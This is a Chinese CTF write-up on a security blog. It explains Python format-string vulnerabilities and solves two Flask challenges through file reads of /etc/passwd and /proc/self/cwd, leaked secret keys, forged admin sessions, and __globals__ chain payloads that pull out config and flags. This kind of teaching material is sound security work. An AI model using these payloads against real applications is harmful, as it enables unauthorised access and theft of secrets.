# 从两道CTF实例看python格式化字符串漏洞

阅读量 **445488**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-02-19 14:30:48

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01cfc03247231573bf.jpg)

## 什么是python格式化字符串漏洞

pyhton中，存在几种格式化字符串的方式，然而当我们使用的方式不正确的时候，即格式化的字符串能够被我们控制时，就会导致一些严重的问题，比如获取敏感信息

###  python常见的格式化字符串

**百分号形式进行格式化字符串**

    
    
    >>> name = 'Hu3sky'
    >>> 'My name is %s' %name
    'My name is Hu3sky'
    

**使用标准库中的模板字符串**

`string.Template()`

    
    
    >>> from string import Template
    >>> name = 'Hu3sky'
    >>> s = Template('My name is $name')
    >>> s.substitute(name=name)
    'My name is Hu3sky'
    

**使用format进行格式化字符串**

format的使用就很灵活了，比如以下  
最普通的用法就是直接格式化字符串

    
    
    >>> 'My name is {}'.format('Hu3sky')
    'My name is Hu3sky'
    

指定位置

    
    
    >>> 'Hello {0} {1}'.format('World','Hacker')
    'Hello World Hacker'
    >>> 'Hello {1} {0}'.format('World','Hacker')
    'Hello Hacker World'
    

设置参数

    
    
    >>> 'Hello {name} {age}'.format(name='Hacker',age='17')
    'Hello Hacker 17'
    

百分比格式

    
    
    >>> 'We have {:.2%}'.format(0.25)
    'We have 25.00%'
    

获取数组的键值

    
    
    >>> '{arr[2]}'.format(arr=[1,2,3,4,5])
    '3'
    

用法还有很多，就不一一列举了  
这里看一种错误的用法  
先是正常打印

    
    
    >>> config = {'SECRET_KEY': 'f0ma7_t3st'}
    >>> class User(object):
    ...     def __init__(self, name):
    ...             self.name = name
    >>> 'Hello {name}'.format(name=user.name)
    Hello hu3sky
    

恶意利用

    
    
    >>> 'Hello {name}'.format(name=user.__class__.__init__.__globals__)
    "Hello {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'config': {'SECRET_KEY': 'f0ma7_t3st'}, 'User': <class '__main__.User'>, 'user': <__main__.User object at 0x03242EF0>}"
    

可以看到，当我们的`name=user.__class__.__init__.__globals__`时，就可以将很多敏感的东西给打印出来

## SWPUCTF 皇家线上赌场

###  文件读取

根据首页弹出的xss，来到路径  
`http://107.167.188.241/static?file=test.js`  
接着发现任意文件读取  
`http://107.167.188.241/static?file=/etc/passwd`  
发现泄露：  
`http://107.167.188.241/source`  
文件目录

    
    
    [root@localhost]# tree web
    web/
    ├── app
    │   ├── forms.py
    │   ├── __init__.py
    │   ├── models.py
    │   ├── static
    │   ├── templates
    │   ├── utils.py
    │   └── views.py
    ├── req.txt
    ├── run.py
    ├── server.log
    ├── start.sh
    └── uwsgi.ini
    [root@localhost]# cat views.py.bak
    filename = request.args.get('file', 'test.js')
    if filename.find('..') != -1:
        return abort(403)
    filename = os.path.join('app/static', filename)
    
    
    
    /etc/mtab文件：
    /etc/mtab该文件也是记载当前系统已经装载的文件系统，包括一些操作系统虚拟文件，这跟/etc/fstab有些不同。/etc/mtab文件在mount挂载、umount卸载时都会被更新， 时刻跟踪当前系统中的分区挂载情况。
    
    /proc/mounts文件：
    其实还有个/proc/mounts，这个文件也记录当前系统挂载信息，通过比较，/etc/mtab有的内容，/proc/mounts也有，只是序有所不同，另外还多了一条根文件系统信息：
    

查看工作目录  
`/proc/mounts` 或者 `/etc/mtab`  
发现web  
`/home/ctf/web_assli3fasdf`  
但是除了  
`http://107.167.188.241/static?file=/home/ctf/web_assli3fasdf/app/static/test.js`,其余的文件都读不到

###  绕过目录限制

可以用`/proc/self/cwd`绕过，cwd是一个符号链接，指向了实际的工作目录  
views.py `http://107.167.188.241/static?file=/proc/self/cwd/app/views.py`

    
    
    def register_views(app):
        @app.before_request
        def reset_account():
            if request.path == '/signup' or request.path == '/login':
                return
            uname = username=session.get('username')
            u = User.query.filter_by(username=uname).first()
            if u:
                g.u = u
                g.flag = 'swpuctf{xxxxxxxxxxxxxx}'
                if uname == 'admin':
                    return
                now = int(time())
                if (now - u.ts >= 600):
                    u.balance = 10000
                    u.count = 0
                    u.ts = now
                    u.save()
                    session['balance'] = 10000
                    session['count'] = 0
    
        @app.route('/getflag', methods=('POST',))
        @login_required
        def getflag():
            u = getattr(g, 'u')
            if not u or u.balance < 1000000:
                return '{"s": -1, "msg": "error"}'
            field = request.form.get('field', 'username')
            mhash = hashlib.sha256(('swpu++{0.' + field + '}').encode('utf-8')).hexdigest()
            jdata = '{{"{0}":' + '"{1.' + field + '}", "hash": "{2}"}}'
            return jdata.format(field, g.u, mhash)
    

非admin用户10分钟会重置一次，所以需要构造admin和大于1000000的钱

`__init__.py`:
`http://107.167.188.241/static?file=/proc/self/cwd/app/__init__.py`

拿到s_key 即可伪造session

    
    
    from flask import Flask
    from flask_sqlalchemy import SQLAlchemy
    from .views import register_views
    from .models import db
    
    
    def create_app():
        app = Flask(__name__, static_folder='')
        app.secret_key = '9f516783b42730b7888008dd5c15fe66'
        app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/test.db'
        register_views(app)
        db.init_app(app)
        return app
    

利用脚本解密session

    
    
    {'csrf_token': '1021549e4ee8bf4fb8fed45620974526275c04d8', 'count': 0, 'balance': 10000, 'username': 'hu3sky'}
    

接着用key伪造

    
    
    "{'csrf_token': '10
    21549e4ee8bf4fb8fed45620974526275c04d8', 'count': 0, 'balance': 1000000, 'username': 'admin'}"
    

![](https://p1.ssl.qhimg.com/t0139611d13e02a94e8.png)

###  format格式化字符串漏洞

然后访问`/getflag`  
关键代码

    
    
     def getflag():
            u = getattr(g, 'u')
            if not u or u.balance < 1000000:
                return '{"s": -1, "msg": "error"}'
            field = request.form.get('field', 'username')
            mhash = hashlib.sha256(('swpu++{0.' + field + '}').encode('utf-8')).hexdigest()
            jdata = '{{"{0}":' + '"{1.' + field + '}", "hash": "{2}"}}'
            return jdata.format(field, g.u, mhash)
    

这里是format格式化字符串漏洞  
可以发现，最后的`jdata.format(field, g.u, mhash)`
里的`field`是我们可控的，`field`是`request.form.get` 从`request`上下文中的`get`方法获取到的  
于是大致的思路是找到`g`对象所在的命名空间，找到`getflag`方法，然后调`__globals__`获取所有变量，再从`getflag`方法中取出`g`对象。由于提升了有`save`方法  
所以最后构造的payload

    
    
    field=save.__globals__[SQLAlchemy].__init__.__globals__[current_app].__dict__[view_functions][getflag].__globals__[g].flag
    

## 百越杯Easy flask

环境：<https://github.com/hongriSec/CTF-Training/tree/master/2018/%E7%99%BE%E8%B6%8A%E6%9D%AF2018/Web>

###  环境搭建

修改工作目录名为flaskr  
然后`set FLASK_APP=__init__.py`  
接着`flask init-db` 初始化数据库  
就可以`flask run`了

###  用户遍历

打开题目，有注册和登陆（源码里没附css。。搭出来的环境界面很简单）

  
先注册账号  
登陆

![](https://p3.ssl.qhimg.com/t01f713adf12d2e4f82.png)

可以看到有一个`edit secert`的功能

![](https://p0.ssl.qhimg.com/t01ea79c0b319f2bbda.png)

提交后会显示在页面上

![](https://p3.ssl.qhimg.com/t01b2c90f83ca2a04bf.png)

观察url  
`views?id=6`  
于是我们修改id，发现可以遍历用户，在id=5时是admin

![](https://p2.ssl.qhimg.com/t01fff6bdfd06a5e557.png)

###  源码审计

通过www-zip下载到源码  
目录结构

![](https://p2.ssl.qhimg.com/t0155f1bf73eb666186.png)

几个关键点

auth.py

    
    
        ... //省略
    @bp_auth.route('/flag')
    @login_check
    def get_flag():
        if(g.user.username=="admin"):
            with open(os.path.dirname(__file__)+'/flag','rb') as f:
                flag = f.read()
            return flag
        return "Not admin!!"
        ...//省略
    

secert.py

    
    
        ...//省略
    @bp_secert.route('/views',methods = ['GET','POST'])
    @login_check
    def views_info():
        view_id = request.args.get('id')
        if not view_id:
            view_id = session.get('user_id')
    
        user_m = user.query.filter_by(id=view_id).first()
    
        if user_m is None:
            flash(u"该用户未注册")
            return render_template('secert/views.html')
    
        if str(session.get('user_id'))==str(view_id):
            secert_m = secert.query.filter_by(id=view_id).first()
            secert_t = u"<p>{secert.secert}<p>".format(secert = secert_m)
        else:
            secert_t = u"<p>***************************************<p>"
    
        name = u"<h1>name:{user_m.username}<h1>"
        email = u"<h2>email:{user_m.email}<h2>"
    
        info = (name+email+secert_t).format(user_m=user_m)
        return render_template('secert/views.html',info = info)
    
        ...//省略
    

###  format格式化字符串

从auth可以看到，当用户是admin的时候才可以访问`/flag`  
在已登录的用户里发现了session

![](https://p5.ssl.qhimg.com/t01cb9d067e83b51a79.png)

用脚本解密

    
    
    (test_py3) λ python flask_session解密.py "eyJ1c2VyX2lkIjo2fQ.XFKzTQ.Ucu4Lbwm0b0nJM8QM_9j41MGkPc
    "
    {'user_id': 6}
    

于是现在思路很明确了  
伪造成admin->访问/flag->get flag  
那么现在就要想办法拿到`SECRET_KEY`这样才能伪造session  
在secret.py

![](https://p3.ssl.qhimg.com/t014b134f924e8d069b.png)

两处format，第一处的secret是我们可控的，就是edit secert，于是测试  
当我提交`{user_m.password}`时

![](https://p5.ssl.qhimg.com/t01d830b5797ea8aca2.png)

出现了sha256加密的密码，于是我们就可以通过这里去读SECRET_KEY

在`secert.py`的开头`import`了`current_app`,于是可以通过获取`current_app`来获取`SECRET_KEY`  
payload

    
    
    {user_m.__class__.__mro__[1].__class__.__mro__[0].__init__.__globals__[SQLAlchemy].__init__.__globals__[current_app].config}
    

###  Session伪造

获取到`SECRET_KEY` 后，就是利用脚本伪造session了  
利用加密脚本生成session

    
    
    (test_py3) λ python flask_session加密.py encode -t "{'user_id': 5}" -s "test"
    eyJ1c2VyX2lkIjo1fQ.XFLUdg.rVvk_CdUlXvLedmJSCD8YYUABZg
    

修改session后

![](https://p2.ssl.qhimg.com/t01d76bbbb5fddcf4d1.png)

访问 /flag

![](https://p1.ssl.qhimg.com/t014bd202370d6e180e.png)

## 总结

在一般的CTF中，通常格式化字符串漏洞会和session机制的问题，SSTI等一起出现.一般来说，在审计源码的过程中，看到了使用format，且可控，那基本上就可以认为是format格式化字符串漏洞了。

## 参考文章

<https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html>  
<https://bbs.ichunqiu.com/thread-48533-1-1.html>  
[https://mochazz.github.io/2018/12/11/python%20web%E4%B9%8Bflask%20session&%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/](https://mochazz.github.io/2018/12/11/python%20web%E4%B9%8Bflask%20session&%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Hu3sky** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/170620](/post/id/170620)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Python](/tag/Python)
  * [Web安全](/tag/Web安全)
  * [代码安全](/tag/代码安全)

 **+1** __11赞

 __收藏

![](https://p3.ssl.qhimg.com/t01a710721b2fdebc36.jpg) Hu3sky

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

